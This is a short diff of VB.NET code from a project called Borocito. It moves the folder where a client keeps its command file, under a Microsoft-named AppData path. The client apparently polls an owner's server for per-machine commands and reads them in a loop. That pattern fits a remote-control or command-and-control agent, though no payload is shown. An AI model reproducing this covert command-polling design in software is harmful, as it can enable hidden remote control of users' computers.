@@ -1,6 +1,7 @@
 ﻿Imports Microsoft.Win32
 Public Class Init
-    Dim DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
+    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
+    Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
     Dim UID As String
     Dim threadReader As Threading.Thread
     Dim lastCommand As String
@@ -41,7 +42,7 @@ Public Class Init
     Sub ReadingCommand()
         Try
             While True
-                Dim LocalCommandFile As String = DIRCommons & "\[" & UID & "]broRescue.str"
+                Dim LocalCommandFile As String = DIRHome & "\[" & UID & "]broRescue.str"
                 Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & UID & "]Command.str"
                 If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
                     My.Computer.FileSystem.DeleteFile(LocalCommandFile)
@@ -78,7 +79,7 @@ Public Class Init
     End Sub
     Sub ReadCommand()
         Try
-            Dim filePath As String = DIRCommons & "\[" & UID & "]broRescue.str"
+            Dim filePath As String = DIRHome & "\[" & UID & "]broRescue.str"
             Dim commandOne As String = IO.File.ReadAllLines(filePath)(1).Split(">"c)(1).Trim()
             If commandOne <> Nothing Then
                 If lastCommand <> commandOne Then
